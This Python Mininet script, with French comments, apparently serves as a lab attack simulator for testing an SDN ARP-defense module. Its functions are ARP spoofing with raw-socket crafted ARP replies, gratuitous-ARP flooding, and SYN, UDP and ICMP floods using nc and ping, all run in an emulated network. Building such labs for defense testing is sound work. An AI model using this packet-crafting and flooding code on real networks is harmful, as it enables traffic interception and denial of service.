#!/usr/bin/env python3

from mininet.net import Mininet
from mininet.node import Controller, OVSSwitch, RemoteController
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel
import time

def customTopology():
    net = Mininet(controller=RemoteController, link=TCLink, switch=OVSSwitch)
    
    net.addController('c0', ip='172.18.0.2', port=6633)
    
    h1 = net.addHost('h1', ip='10.0.1.10/24')
    h2 = net.addHost('h2', ip='10.0.1.11/24')
    h3 = net.addHost('h3', ip='10.0.1.12/24')
    s1 = net.addSwitch('s1')
    
    h4 = net.addHost('h4', ip='10.0.2.10/24')
    h5 = net.addHost('h5', ip='10.0.2.11/24')
    h6 = net.addHost('h6', ip='10.0.2.20/24')
    s2 = net.addSwitch('s2')
    
    router = net.addHost('r0', ip='10.0.1.1/24')
    
    net.addLink(h1, s1)
    net.addLink(h2, s1)
    net.addLink(h3, s1)
    net.addLink(h4, s2)
    net.addLink(h5, s2)
    net.addLink(h6, s2)
    net.addLink(router, s1)
    net.addLink(router, s2)
    
    net.start()
    
    router.cmd('ifconfig r0-eth1 10.0.2.1/24')
    router.cmd('sysctl -w net.ipv4.ip_forward=1')
    
    for h in [h1, h2, h3]:
        h.cmd('ip route add default via 10.0.1.1')
    for h in [h4, h5, h6]:
        h.cmd('ip route add default via 10.0.2.1')
    
    print('\n=== Configuration initiale ===')
    print('Lancement du serveur web sur H1 (10.0.1.10)')
    h1.cmd('python3 -m http.server 80 &')
    time.sleep(2)
    
    print('Trafic légitime activé (H2, H3, H4, H5)')
    h2.cmd('while true; do curl -s http://10.0.1.10 > /dev/null; sleep 3; done &')
    h3.cmd('while true; do curl -s http://10.0.1.10 > /dev/null; sleep 3; done &')

    net.pingAll()
    
    print('\n' + '='*60)
    print('MENU DES ATTAQUES DISPONIBLES')
    print('='*60)
    
    while True:
        print('\n[1] ARP Spoofing - Usurpation de H4 (IP Hijacking)')
        print('[2] ARP Flood - 1 MAC prétend avoir plusieurs IPs')
        print('[4] SYN Flood - Spam de requêtes TCP SYN')
        print('[5] UDP Flood - Spam de requêtes UDP')
        print('[6] ICMP Flood - Spam de requêtes ICMP')
        print('[7] Règle overflow des switch')
        print('[8] Lancer CLI Mininet (debug)')
        print('[0] Quitter')
        
        choice = input('\nChoisir une attaque (1-6, 7, 8, 0) : ').strip()
        
        if choice == '1':
            arp_spoofing_attack(net, h6, '10.0.2.10', h4)
        elif choice == '2':
            arp_flood_attack(net, h6)
        elif choice == '4':
            syn_flood(net, h6, '10.0.2.10', h5)
        elif choice == '5':
            udp_flood(net, h6, '10.0.2.10', h5)
        elif choice == '6':
            icmp_flood(net, h6, '10.0.2.10', h5)
        elif choice == '7':
            regle_overflow(net, h6)
        elif choice == '8':
            print('\n=== CLI Mininet (tapez "exit" pour revenir au menu) ===')
            CLI(net)
        elif choice == '0':
            break
        else:
            print('Choix invalide!')
    
    print('\nArrêt du réseau...')
    net.stop()



def syn_flood(net, attacker, target_ip, trigger_host):
    print('\n' + '='*60)
    print('ATTAQUE 4 : SYN FLOOD')
    print('='*60)
    print(f'Attaquant : {attacker.name}')
    print(f'→ Envoi de 60 SYN vers {target_ip}')

    if not test_ip(attacker, target_ip):
        print('Timeout/IP bloquée ')
        return

    attacker.cmd('for i in {1..60}; do (nc -w 0 ' + target_ip + ' 80 &); done')

    time.sleep(0.5)
    trigger_host.cmd(f'ping -c 1 {target_ip} > /dev/null')
    print('Attaque terminée')


def udp_flood(net, attacker, target_ip,trigger_host):
    print('\n' + '='*60)
    print('ATTAQUE 4 : UDP FLOOD')
    print('='*60)
    print(f'Attaquant : {attacker.name}')
    print(f'→ Envoi de 60 UDP vers {target_ip}')

    if not test_ip(attacker, target_ip):
        print('Timeout/IP bloquée')
        return

    attacker.cmd('for i in {1..60}; do echo "ATTACK DE H1 PAR MOIIIII" | nc -u -w 0 ' + target_ip + ' 5000; done')
    time.sleep(0.5)
    trigger_host.cmd(f'ping -c 1 {target_ip} > /dev/null')
    
    print('Attaque terminée')


def icmp_flood(net, attacker, target_ip, trigger_host):
    print('\n' + '='*60)
    print('ATTAQUE 4 : ICMP FLOOD')
    print('='*60)
    print(f'Attaquant : {attacker.name}')
    print(f'→ Envoi de 80 ICMP vers {target_ip}')

    rc = attacker.cmd('ping -c 80 -i 0.01 -W 1 -w 3 ' + target_ip + '; echo $?').strip()
    time.sleep(0.5)
    trigger_host.cmd(f'ping -c 1 {target_ip} > /dev/null')
    

    if rc != '0':
        print('Timeout/IP bloquée')
        return
        
    print('Attaque terminée')


def test_ip(host, ip, count=1):
    rc = host.cmd(f'ping -c {count} {ip} > /dev/null 2>&1; echo $?').strip()
    return rc == '0'

def regle_overflow(net, attacker):
    print('\n' + '='*60)
    print("SWITCH 1")
    print('='*60)
    
    print(attacker.cmd('ovs-ofctl dump-flows s1'))

    print('\n' + '='*60)
    print("SWITCH 2")
    print('='*60)

    print(attacker.cmd('ovs-ofctl dump-flows s2'))

def craft_arp_packet(src_mac, src_ip, dst_mac, dst_ip, operation='reply'):
    """
    Crée un paquet ARP en bytes
    operation: 'request' (1) ou 'reply' (2)
    """
    import socket
    
    # Convertir MAC en bytes
    def mac_to_bytes(mac):
        return bytes.fromhex(mac.replace(':', ''))
    
    # Convertir IP en bytes
    def ip_to_bytes(ip):
        return socket.inet_aton(ip)
    
    # Frame Ethernet
    eth_dst = mac_to_bytes(dst_mac)
    eth_src = mac_to_bytes(src_mac)
    eth_type = b'\x08\x06'  # ARP = 0x0806
    
    # Paquet ARP
    hw_type = b'\x00\x01'       # Ethernet
    proto_type = b'\x08\x00'    # IPv4
    hw_size = b'\x06'           # Taille MAC
    proto_size = b'\x04'        # Taille IP
    
    # Operation: 1=request, 2=reply
    op_code = b'\x00\x02' if operation == 'reply' else b'\x00\x01'
    
    sender_mac = mac_to_bytes(src_mac)
    sender_ip = ip_to_bytes(src_ip)
    target_mac = mac_to_bytes(dst_mac)
    target_ip = ip_to_bytes(dst_ip)
    
    # Assembler le paquet ARP
    arp_packet = (hw_type + proto_type + hw_size + proto_size + 
                  op_code + sender_mac + sender_ip + target_mac + target_ip)
    
    # Paquet complet
    full_packet = eth_dst + eth_src + eth_type + arp_packet
    
    return full_packet

def send_raw_packet(host, interface, packet_bytes):
    """
    Envoie un paquet raw depuis un host Mininet
    """
    import base64
    
    # Encoder le paquet en base64 pour le passer en paramètre
    packet_b64 = base64.b64encode(packet_bytes).decode()
    
    # Script Python inline pour envoyer le paquet
    send_script = f'''
import socket
import base64

packet = base64.b64decode("{packet_b64}")
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("{interface}", 0))
s.send(packet)
s.close()
print("Paquet envoyé !")
'''
    
    # Exécuter sur le host
    result = host.cmd(f"python3 -c '{send_script}'")
    return result

def arp_spoofing_attack(net, attacker, target_ip, target_host):
    """
    Fonction d'attaque ARP Spoofing compatible avec ton code
    Sans Scapy - utilise raw sockets
    """
    print('\n' + '='*60)
    print('ATTAQUE 1 : ARP SPOOFING (IP Hijacking)')
    print('='*60)

    if not test_ip(attacker, target_ip):
        print('Timeout/IP bloquée ')
        return


    print(f'Attaquant : {attacker.name} ({attacker.IP()})')
    print(f'Cible : {target_ip}')
    
    real_mac = target_host.MAC()
    attacker_mac = attacker.MAC()
    attacker_iface = attacker.defaultIntf().name
    
    print(f'MAC légitime de {target_ip} : {real_mac}')
    print(f'MAC de l\'attaquant : {attacker_mac}')
    print(f'\n L\'attaquant envoie des ARP Reply prétendant que {target_ip} a la MAC {attacker_mac}')
    
    # Créer le paquet ARP malveillant en broadcast
    # Ethernet dst=broadcast, ARP: "Je suis target_ip et ma MAC est attacker_mac"
    poisoned_packet = craft_arp_packet(
        src_mac=attacker_mac,
        src_ip=target_ip,
        dst_mac="ff:ff:ff:ff:ff:ff",  # Broadcast
        dst_ip=target_ip,
        operation='reply'
    )
   
    print("Envoi de 10 paquets ARP falsifiés via raw socket...")
    
    # Envoyer les paquets depuis l'attaquant
    for i in range(10):
        send_raw_packet(attacker, attacker_iface, poisoned_packet)
        time.sleep(0.1)
        if (i + 1) % 10 == 0:
            print(f"   {i + 1}/50 paquets envoyés...")
    
    print('Attaque terminée')


def arp_flood_attack(net, attacker):
    print('\n' + '='*60)
    print('ATTAQUE 2 : ARP FLOOD (Multiple IPs per MAC)')
    print('='*60)

    if not test_ip(attacker, "10.0.2.10"):
        print('Timeout/IP bloquée ')
        return


    print(f'Attaquant : {attacker.name} ({attacker.IP()})')
    print('Une seule MAC prétend avoir 10 IPs différentes')
    
    attacker_mac = attacker.MAC()
    attacker_iface = attacker.defaultIntf().name
    
    fake_ips = [
        '10.0.2.50', '10.0.2.51'
    ]
    
    print(f'IPs usurpées : {fake_ips}')
    
    for fake_ip in fake_ips:
        # Créer un Gratuitous ARP (annonce que fake_ip a la MAC de l'attaquant)
        # En broadcast pour que tout le monde l'entende
        gratuitous_packet = craft_arp_packet(
            src_mac=attacker_mac,
            src_ip=fake_ip,
            dst_mac="ff:ff:ff:ff:ff:ff",
            dst_ip=fake_ip,
            operation='reply'  # Gratuitous ARP = ARP reply non sollicité
        )
        
        for _ in range(1):
            send_raw_packet(attacker, attacker_iface, gratuitous_packet)
        
        print(f'  Envoi ARP pour {fake_ip}')
        time.sleep(0.2)
    
    print('Attaque terminée')

if __name__ == '__main__':
    setLogLevel('info')
    print('''
╔═══════════════════════════════════════════════════════════╗
║   SIMULATEUR D'ATTAQUES ARP SPOOFING - MININET + POX      ║
║   Compatible avec arp_defense.py                          ║
╚═══════════════════════════════════════════════════════════╝
''')
    
    input('Appuyez sur Entrée pour démarrer la topologie...')
    customTopology()
